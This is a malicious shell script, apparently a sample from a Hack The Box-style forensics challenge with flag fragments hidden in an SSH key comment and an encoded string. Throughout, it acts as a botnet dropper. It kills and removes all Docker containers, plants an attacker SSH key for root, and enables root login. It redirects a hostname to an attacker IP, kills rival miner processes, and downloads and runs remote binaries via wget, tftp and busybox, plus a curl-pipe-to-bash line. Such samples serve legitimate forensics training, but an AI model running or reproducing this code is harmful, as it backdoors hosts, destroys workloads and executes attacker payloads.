#!/bin/sh

if [ "$HOSTNAME" != "MY-MACHINE-011" ]; then
    exit
fi

if [ "$EUID" -ne 0 ]; then
    exit
fi

docker kill $(docker ps -q)
docker rm $(docker ps -a -q)

echo "ssh-rsa BBCCB4OzbD1zd2FEEEBEBRBCBBBCBRDm0lJO33JKJTJvgnrqrh54E7t4K0M7YW2lfq0sOzhZ1T1JeF8IEBg7z1jqCWvHUzhHtr+y4zWoywfHtiWQ48ZnjdRIKNDJmkno6Qp0SND48rjin/9zupFZulLlfjUS02d6EzJdEoY3RemTnFrQrTOSR/YEhN7rJC/WqZuBiL/7EpF8qrepGOCV5+KmrfXZqtNP+rlIvhLB5V22xFHt8yH2YzzEusCdx10yz+N7V8Wqu0uFbefW973uYOOOqVhZHJGFtsEFBkcNlFtVx+jRnYh37FvtFGkDWkCzTHI3G+FRuxjo3ZnycC9ISNzPJzOoYxDGbZV5KkUOozzmVCq/YC6C user@si_eman_ym{BTH" >> /root/.ssh/authorized_keys
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "128.40.49.59 legions.korp.htb" >> /etc/hosts

for filename in /proc/*; do
    ex=$(ls -latrh $filename 2> /dev/null|grep exe)
    if echo $ex |grep -q "/var/tmp/java\|/var/lib/postgresql/data/pоstmaster\|/memfd\|/var/lib/postgresql/data/pgdata/pоstmaster\|/tmp/.metabase/metabasew\|/var/lib/postgresql/data/postgres\|atlas.x86\|dotsh\|/tmp/systemd-private-\|bin/sysinit\|.bin/xorg\|nine.x86\|data/pg_mem\|/var/lib/postgresql/data/.*/memory\|/var/tmp/.bin/systemd\|balder\|sys/systemd\|rtw88_pcied\|.bin/x\|httpd_watchdog\|/var/Sofia\|3caec218-ce42-42da-8f58-970b22d131e9\|/tmp/watchdog\|cpu_hu\|/tmp/Manager\|/tmp/manh\|/tmp/agettyd"; then
        result=$(echo "$filename" | sed "s/\/proc\///")
        kill -9 $result
        echo found $filename $result
    fi
done

ARCH=$(uname -m)
echo "!!! curl -s http://14camels.com/14$ARCH | bash -c 'L54TA5KSL5DXEMDVJZSCCIL5' " >> /etc/resolv.conf

array=("x86" "x86_64" "mips" "aarch64" "arm")

if [[ $(echo ${array[@]} | grep -o "$ARCH" | wc -w) -eq 0 ]]; then
  exit
fi


cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777 0xda4.0xda4.$ARCH; ./0xda4.0xda4.$ARCH; 
cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; tftp legions.korp.htb -c get 0xda4.0xda4.$ARCH; cat 0xda4.0xda4.$ARCH > DVRHelper; chmod +x *; ./DVRHelper $ARCH; 
cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; busybox wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777;./0xda4.0xda4.$ARCH;
